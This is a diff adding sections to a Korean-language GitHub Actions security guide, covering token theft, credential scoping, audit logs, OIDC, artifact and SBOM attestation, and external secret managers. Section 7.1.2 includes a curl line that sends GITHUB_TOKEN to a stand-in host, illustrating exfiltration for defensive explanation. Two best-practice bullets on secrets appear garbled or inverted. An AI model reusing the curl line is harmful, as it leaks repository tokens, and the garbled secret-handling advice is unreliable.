@@ -218,3 +218,201 @@ with:
 
 ### 7.1.2 도용
 
+공격자가 작업을 통해 `GITHUB_TOKEN`을 탈취할 수 있기에 GitHub Actions는 워크플로를 실행하는 리포지토리로 제한된 범위의 권한이 토큰을 자동으로 제공한다. 작업이 완료되면 토큰이 만료되며 향후 재사용할 수 없다.
+
+손상된 러너를 사용하여 작업 실행 중에 토큰을 탈취할 수 있기 때문에, 공격자는 만료되기 전에 토큰을 캡처하기 위해 제어하는 서버에 대한 요청을 자동화할 수 있다.
+
+```yml
+curl http://example.com?token=$GITHUB_TOKEN
+```
+
+## 7.2 리포지토리 콘텐츠 수정
+
+`GITHUB_TOKEN` 토큰을 도난당한 경우 공격자 제어 시스템은 이를 사용하여 GitHub API를 호출하고 리포지토리 콘텐츠를 수정할 수 있기에 최소 권한 원칙을 토큰의 권한에 적용하면 위험을 줄일 수 있으며, 토큰의 액세스를 작업에 필요한 것으로만 제한한다.
+
+### 7.2.1 리포지토리 간 액세스 관리
+
+워크플로에서 여러 리포지토리에 액세스해야 하는 경우 보안 위험을 최소화하는 자격 증명을 선택하는 것이 중요하다. 가장 선호도가 낮은 옵션 중 일부는 다음과 같다.
+
+1. **GITHUB_TOKEN**
+   * GitHub는 각 워크플로 실행에 대해 `GITHUB_TOKEN`을 자동으로 생성하여 워크플로를ㄹ 트리거하고 해당 리포지토리에 대한 쓰기 액세스 사용자에 해당하는 권한을 제공하는 단일 리포지토리로 범위가 지정된다. 토큰은 각 작업의 시작 부분에 만들어지고 작업이 완료되면 만료처리되어 재사용이 불가능하다.
+   * 가능하면 `GITHUB_TOKEN` 보안 및 범위 인증에 사용한다.
+2. **리포지토리 배포 키**
+   * 워크플로 내에서 Git을 사용하여 복제하거나 푸시하려면 단일 리포지토리에 대한 읽기 또는 쓰기 액세스를 제공하는 배포 키를 사용한다.
+   > **배포 키는 GitHub의 REST 또는 GraphQL API에 대한 액세스를 지원하지 않고 API 액세스가 필요하지 않고 Git 액세스가 충분한 경우에만 사용한다.**
+3. **GitHub Apps Token**
+   * GitHub Apps는 세분화된 권한을 제공하며 선택한 리포지토리에 설치할 수 있으며 내부 GitHub Apps을 만들고 필요한 리포지토리에 설치해 워크플로 내에서 앱 설치로 인증하여 해당 리포지토리에 액세스할 수 있다.
+4. **Parsonal Access Token**
+   * 워크플로에서 클래식 개인용 액세스 토큰을 사용하지 않으며 이러한 토큰은 사용자와 연결된 모든 개인 및 조직 리포지토리에 광범위한 액세스 권한을 부여하여 상당한 위험을 초래한다. 워크플로가 여러 기여자가 있는 리포지토리에서 실행되는 경우 모든 쓰기 액세스 사용자는 해당 토큰의 권한을 효과적으로 상속한다.
+   > **개인 토큰을 사용해야 하는 경우 전용 조직 계정에 연결된 세분화된 PAT를 생성하고 워크플로에 필요한 특정 리포지토리로만 액세스를 제한한다.**
+5. **개인 계정의 SSH키**
+   * 워크플로에서 개인 계정의 SSH 키를 사용하면 안되며, 클래식 PAT와 마찬가지로 개인 및 조직 리포지토리를ㄹ 포함하여 계정과 연결된 모든 리포지토리에 대한 액세스 권한을 부여한다. 이 실수는 단순한 위험이 아닌 전체 워크플로와 계정에 대한 위험에 노출된다.
+   > **사용 사례에 Git을 통한 복제 또는 푸시가 필요한 경우 대신 배포 키를 사용하는 것이 좋다. 관련 없는 리포지토리를 노출하거나 개인 자격 증명을 요구하지 않고 범위가 지정된 액세스를 제공한다.**
+
+# 8. GitHub 작업 이벤트 감사
+
+작업 유형, 실행 시기 및 작업을 수행한 개인 계정은 `보안 로그` 및 `감사 로그`에 기록된다. `보안 로그`는 사용자 계정과 관련된 이벤트를 기록하고 `감사 로그`는 조직과 관련된 이벤트를 기록하기 때문에 이러한 두 로그를 모두 확인하면 GitHub 작업과 관련된 이벤트를 감사할 수 있다.
+
+# 9. GitHub Actions에서 OIDC 사용
+
+클라우드 공급자와 직접 인증하도록 워크플로를 구성할 수 있으며, 더 이상 자격 증명을 비밀로 저장할 필요가 없다.
+
+## 9.1 GitHub Actions에 대한 아티팩트 증명
+
+아티팩트 증명은 빌드의 출처를 확립하고, 빌드된 항목, 위치 및 방법을 확인하여 S/W 공급망 보안을 개선하는 데 도움이 된다.
+
+### 9.1.1 증명할 내용
+
+GitHub Actions를 사용하면 이진 파일 및 컨테이너 이미지에 대한 빌드 출처와 S/W 자재 목록(SBOM)을 증명할 수 있다.
+
+### 9.1.2 빌드의 아티팩트 증명 생성
+
+빌드에 대한 아티팩트 증명을 생성하는 경우 다음을 확인해야 한다.
+
+* 워크플로에 구성된 적절한 권한이 있는지?
+* 빌드 출처 증명 작업을 사용하는 단계를 워크플로에 포함되는지?
+
+#### 이진 파일의 빌드 출처에 대한 증명 생성
+
+1. 사용자가 확인하려는 이진 파일을 빌드하기 위한 워크플로에 다음 권한을 추가해야 한다. 
+   ```yml
+   permissions:
+    id-token: write
+    contents: read
+    attestations: write
+   ```
+2. 이진 파일이 빌드되는 단계 다음에 다음 단계를 추가해야 한다.
+   ```yml
+   - name: Generate artifact attestation
+     uses: actions/attest-build-provenance@v2
+     with:
+       subject-path: 'PATH/TO/ARTIFACT'
+   ```
+
+#### 컨테이너 이미지의 빌드 출처에 대한 증명 생성
+
+1. 컨테이너 이미지를 빌드하는 워크플로에 다음 권한을 추가한다.
+   ```yml
+   permissions:
+   id-token: write
+   contents: read
+   attestations: write
+   packages: write
+   ```
+2. 컨테이너 이미지를 빌드한 후 다음 단계를 추가한다.
+   ```yml
+   - name: Generate artifact attestation
+     uses: actions/attest-build-provenance@v2
+     with:
+      subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
+      subject-digest: 'sha256:fedcba0...'
+      push-to-registry: true
+   ```
+
+## 9.2 SBOM에 대한 증명 생성
+
+SBOM에 대한 SBOM 증명을 생성하는 기능이 있으며 생성 후 증명하려면 다음과 같이 단계를 수행해야 한다.
+
+* 워크플로에서 적절한 권한을 설정해야 한다.
+* 워크플로의 단계에서 아티팩트의 SBOM을 생성해야 한다.
+* `attest-sbom` 작업을 사용하는 워크플로에 단계 포함한다.
+
+### 9.2.1 이진 파일의 SBOM 증명 생성
+
+1. SBOM 증명을 생성할 이진 파일을 빌드하는 워크플로에 다음 권한을 추가한다.
+```yml
+  permissions:
+    id-token: write
+    contents: read
+    attestations: write
+```
+1. 이진 파일이 빌드되고 SBOM이 생성된 단계 다음에 다음 단계를 추가한다.
+```yml
+- name: Generate SBOM attestation
+    uses: actions/attest-sbom@v1
+    with:
+      subject-path: 'PATH/TO/ARTIFACT'
+      sbom-path: 'PATH/TO/SBOM'
+```
+
+> [!WARNING]
+> **주의해야 할 점은 `subject-path` 매개 변수의 값이 SBOM에서 바이너리 파일의 경로로 설정되어야 한다. `sbom-path` 매개 변수의 값은 생성한 SBOM 파일의 경로로 설정해야 한다.**
+
+### 9.2.2 컨테이너 이미지의 SBOM 증명 생성
+
+1. SBOM 증명을 생성할 이진 파일을 빌드하는 워크플로에 다음 권한을 추가한다.
+```yml
+permissions:
+    id-token: write
+    contents: read
+    attestations: write
+    packages: write
+```
+2. 이진 파일이 빌드되고 SBOM이 생성된 단계 다음에 다음 단계를 추가한다.
+```yml
+- name: Generate SBOM attestation
+    uses: actions/attest-sbom@v1
+    with:
+      subject-name: ${{ env.REGISTRY }}/PATH/TO/IMAGE
+      subject-digest: 'sha256:fedcba0...'
+      sbom-path: 'sbom.json'
+      push-to-registry: true
+```
+
+> [!WARNING]
+> * **매개 변수 `subject-name`의 값은 완전히 정규화된 이미지 이름을 지정하지만, 이미지 이름의 일부를 태그로 포함하지 말아야 한다.**
+> * **`subject-digest` 매개 변수의 값은 `SHA256` 형식으로 `sha256:HEX_DIGEST` 증명을 위한 주체의 다이제스트로 설정되어야 한다. 워크플로에서 사용하는 `docker/build-push-action` 경우 해당 단계의 다이제스트 출력을 사용하여 값을 제공할 수 있다.**
+> * **매개 변수 값 `sbom-path`은 확인할 JSON 형식의 SBOM 파일 경로로 설정해야 한다.** 
+
+### 9.3.3 GitHub CLI를 사용하여 아티팩트 증명 확인
+
+> [!WARNING]
+> **아티팩트 증명은 워크플로의 아티팩트가 반드시 안전하다는 보장이 없는 것을 기억해야 하며, 아티팩트 증명은 소스 코드와 이를 생성한 빌드 지침에 연결해 준다. S/W를 사용할 때 정책 기준을 정의하고, 콘텐츠를 평가하여 해당 정책을 평가해, 정보에 입각한 위험 결정을 내리는 것은 사용자의 책임이다.**
+
+# 10. 작업 및 워크플로 내에서 암호화된 암호 액세스
+
+[Example GitHub Actions workflow secrets access](../github-crdential/example-sources/example-workflow-secrets-access.yml)
+
+## 10.1 워크플로에서 비밀을 사용하는 모범 사례
+
+* 로그에 echo ${{ secrets.SECRET_NAME }}.
+* 환경 변수에 할당하는 대신 스크립트 명령 내에서 비밀을 사용한다.
+* 필요한 가장 낮은 수준에서 비밀을 정의하여 액세스를 제한한다.
+* 비밀 정보를 주기적으로 변경하고 이에 맞게 워크플로를 업데이트한다.
+
+# 11. 서드파티 비밀를 사용하는 방법
+
+HashiCorp Vault, AWS Secrets Manager 및 Azure Key Vault와 같은 외부 비밀 관리 솔루션과 GitHub Actions를 통합한다.
+
+1. **HashiCorp Vault**
+```yml
+- name: Fetch secret from Vault
+  id: vault
+  uses: hashicorp/vault-action@v2
+  with:
+    url: https://vault.example.com
+    token: ${{ secrets.VAULT_TOKEN }}
+    secret: secret/data/github/my-secret
+```
+2. **AWS Secrets Manager**
+```yml
+- name: Retrieve AWS Secret
+  run: |
+    SECRET_VALUE=$(aws secretsmanager get-secret-value --secret-id my-secret | jq -r .SecretString)
+    echo "SECRET_VALUE=${SECRET_VALUE}" >> $GITHUB_ENV
+```
+3. **Azure Key Vault**
+```yml
+- name: Retrieve Azure Secret
+  uses: Azure/get-keyvault-secrets@v1
+  with:
+    keyvault: "my-keyvault"
+    secrets: "my-secret"
+    azureCredentials: ${{ secrets.AZURE_CREDENTIALS }}
+```
+
+#### 타사 보관소 사용의 이점
+* 중앙 집중식 비밀 관리는 보안 위험을 줄일수 있다.
+* 자동화된 비밀 회전은 보안 정책을 준수하는 데 도움된다.
+* 감사 로그 및 액세스 제어는 보안 모니터링을 향상시킨다.
+* 최소 권한 액세스 는 비밀의 무단 사용을 방지한다.
